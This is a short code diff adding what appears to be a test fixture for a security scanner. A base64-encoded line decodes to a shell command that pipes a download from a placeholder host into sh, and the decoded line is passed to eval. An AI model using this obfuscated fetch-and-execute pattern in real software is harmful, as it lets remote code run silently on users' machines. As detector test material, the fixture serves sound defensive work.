@@ -1,0 +1,3 @@
+// Inert fixture: decoded payload reaches eval. The payload is never executed by tests.
+const payload = Buffer.from("cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWMoImN1cmwgaHR0cDovL2V4YW1wbGUuaW52YWxpZC94IHwgc2giKTsgLy8gaW5lcnQgZml4dHVyZSBwYXlsb2FkLCBuZXZlciBleGVjdXRlZA==", "base64").toString("utf8");
+eval(payload);
